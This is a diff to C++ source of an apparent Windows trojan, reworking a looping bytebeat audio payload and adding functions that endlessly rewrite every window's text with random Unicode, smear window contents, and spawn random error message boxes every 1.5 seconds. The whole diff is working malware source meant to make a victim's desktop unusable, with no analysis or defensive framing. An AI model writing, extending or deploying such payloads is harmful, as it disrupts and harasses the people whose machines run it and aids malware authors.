@@ -9,51 +9,6 @@ int random() {
 	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
 	return out & 0x7fffffff;
 }
-void AudioPayload() {
-	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
-
-	HWAVEOUT hwo;
-	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);
-
-	const int bufsize = 8000 * 10;
-	char* wavedata = (char*)LocalAlloc(0, bufsize);
-
-	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
-	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
-	for (;;) {
-		for (int t = 0; t < bufsize; t++) {
-			if (Time < PAYLOAD_TIME) {
-				wavedata[t] = (((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t);
-			}
-			else if (Time >= PAYLOAD_TIME && Time < 2 * PAYLOAD_TIME) {
-				wavedata[t] = (t - (t >> 4 & t >> 8) & t >> 12) - 1;
-			}
-			else if (Time >= PAYLOAD_TIME * 2 && Time < 3 * PAYLOAD_TIME) {
-				wavedata[t] = ((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t;
-			}
-			else if (Time >= PAYLOAD_TIME * 3 && Time < 4 * PAYLOAD_TIME) {
-				wavedata[t] = (((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t);
-			}
-			else if (Time >= PAYLOAD_TIME * 4 && Time < 5 * PAYLOAD_TIME) {
-				wavedata[t] = ((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t;
-			}
-			else if (Time >= PAYLOAD_TIME * 5 && Time < 6 * PAYLOAD_TIME) {
-				wavedata[t] = (t - (t >> 4 & t >> 8) & t >> 12) - 1;
-			}
-			else if (Time >= PAYLOAD_TIME * 6 && Time < 7 * PAYLOAD_TIME) {
-				wavedata[t] = (((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t);
-			}
-			else if (Time >= PAYLOAD_TIME * 7 && Time < 8 * PAYLOAD_TIME) {
-				wavedata[t] = ((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t;
-			}
-			else if (Time >= PAYLOAD_TIME * 8 && Time < 9 * PAYLOAD_TIME) {
-				wavedata[t] = (t - (t >> 4 & t >> 8) & t >> 12) - 1;
-			}
-		}
-
-		waveOutWrite(hwo, &hdr, sizeof(hdr));
-	}
-}
 int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
 	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
 	XFORM xform;
@@ -69,6 +24,81 @@ int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
 		SetWorldTransform(hdc, &xform);
 	}
 	return nGraphicsMode;
+}
+LPCWSTR GenRandomUnicodeString(int len) {
+	wchar_t* strRandom = new wchar_t[len + 1];
+
+	for (int i = 0; i < len; i++) {
+		strRandom[i] = (random() % 256) + 1024;
+	}
+
+	strRandom[len] = L'\0';
+
+	return strRandom;
+}
+void AudioPayload() {
+	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+
+	HWAVEOUT hwo;
+	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);
+
+	const int bufsize = 8000 * 10;
+	char* wavedata = (char*)LocalAlloc(0, bufsize);
+
+	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
+	for (;;) {
+		for (int t = 0; t < bufsize; t++) {
+			int numPayload = Time / PAYLOAD_TIME;
+			if (numPayload % 3 == 0) {
+				wavedata[t] = (((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t);
+			}
+			else if (numPayload % 3 == 1) {
+				wavedata[t] = (t - (t >> 4 & t >> 8) & t >> 12) - 1;
+			}
+			else if (numPayload % 3 == 2) {
+				wavedata[t] = ((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t;
+			}
+		}
+
+		waveOutWrite(hwo, &hdr, sizeof(hdr));
+	}
+}
+BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
+	SendMessageTimeout(hwnd, WM_SETTEXT, NULL, (LPARAM)GenRandomUnicodeString(random() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);
+
+	RECT rcWindow;
+	GetWindowRect(hwnd, &rcWindow);
+	int cxWindow = rcWindow.right - rcWindow.left;
+	int cyWindow = rcWindow.bottom - rcWindow.top;
+	HDC hdcWindow = GetDC(hwnd);
+	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, SRCCOPY);
+	ReleaseDC(NULL, hdcWindow);
+	DeleteObject(hdcWindow);
+
+	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
+	return true;
+}
+void WindowsCorruptionPayload() {
+	for (;;) {
+		EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
+	}
+}
+void MessageBoxThread() {
+	LPCWSTR strText = GenRandomUnicodeString(random() % 10 + 10);
+	LPCWSTR strTitle = GenRandomUnicodeString(random() % 10 + 10);
+	if (random() % 2 == 0) {
+		MessageBox(NULL, strText, strTitle, MB_ABORTRETRYIGNORE | MB_ICONWARNING);
+	}
+	else {
+		MessageBox(NULL, strText, strTitle, MB_RETRYCANCEL | MB_ICONERROR);
+	}
+}
+void MessageBoxPayload() {
+	for (;;) {
+		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxThread), NULL, 0, NULL);
+		Sleep(1500);
+	}
 }
 void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
 	int dwStartTime = Time;
